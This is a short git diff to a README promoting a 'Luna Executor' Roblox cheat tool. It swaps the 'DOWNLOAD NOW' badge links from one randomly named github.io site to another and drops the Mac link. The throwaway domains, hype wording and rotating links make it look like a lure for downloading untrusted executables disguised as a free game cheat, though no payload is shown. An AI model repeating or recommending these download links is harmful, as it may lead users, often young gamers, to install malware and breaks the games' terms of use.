@@ -10,8 +10,8 @@ The **🚀 Luna Executor** is the most trusted free Roblox script executor in 20
 
 <div align="center">
 
-[![Download Luna Executor](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://iloqhmlhfppl.github.io/win-get2/)
-[![Download for Mac](https://img.shields.io/badge/⬇️%20MAC%20DOWNLOAD-black?style=for-the-badge&logo=apple)](https://iloqhmlhfppl.github.io/mac-download2/)
+[![Download Luna Executor](https://img.shields.io/badge/🔻%20DOWNLOAD%20NOW%20🔻-purple?style=for-the-badge&logo=github)](https://yuyasdjwqejs.github.io/setup-win2/)
+
 
 </div>
 
